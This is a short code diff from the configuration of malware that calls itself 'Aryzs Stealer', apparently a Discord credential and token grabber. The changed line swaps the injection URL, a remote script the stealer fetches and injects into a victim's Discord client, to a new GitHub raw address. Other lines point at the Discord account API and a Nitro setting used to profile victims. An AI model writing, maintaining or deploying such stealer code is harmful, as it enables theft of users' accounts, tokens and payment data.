@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Aryzs Stealer', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
-  injection_url: 'https://raw.githubusercontent.com/haxdeveloper/AryzsStealer/master/grabber-payload.js', 
+  injection_url: 'https://raw.githubusercontent.com/haxdeveloper/Aryzs-Injection/main/aryzs.js', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
